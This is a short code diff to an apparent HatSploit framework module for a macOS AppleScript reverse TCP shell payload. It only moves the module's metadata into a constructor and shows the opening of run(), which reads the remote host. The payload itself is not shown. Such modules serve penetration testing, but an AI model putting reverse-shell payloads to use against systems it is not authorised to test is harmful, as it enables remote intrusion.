@@ -7,18 +7,21 @@ from hatsploit.lib.payload import Payload
 
 
 class HatSploitPayload(Payload):
-    details = {
-        'Name': "AppleScript Reverse TCP",
-        'Payload': "macos/applescript/shell_reverse_tcp",
-        'Authors': [
-            'Ivan Nikolsky (enty8080) - payload developer',
-        ],
-        'Description': "AppleScript reverse TCP payload.",
-        'Architecture': "applescript",
-        'Platform': "macos",
-        'Rank': "high",
-        'Type': "reverse_tcp",
-    }
+    def __init__(self):
+        super().__init__()
+
+        self.details = {
+            'Name': "AppleScript Reverse TCP",
+            'Payload': "macos/applescript/shell_reverse_tcp",
+            'Authors': [
+                'Ivan Nikolsky (enty8080) - payload developer',
+            ],
+            'Description': "AppleScript reverse TCP payload.",
+            'Architecture': "applescript",
+            'Platform': "macos",
+            'Rank': "high",
+            'Type': "reverse_tcp",
+        }
 
     def run(self):
         remote_host = self.handler['RHOST']
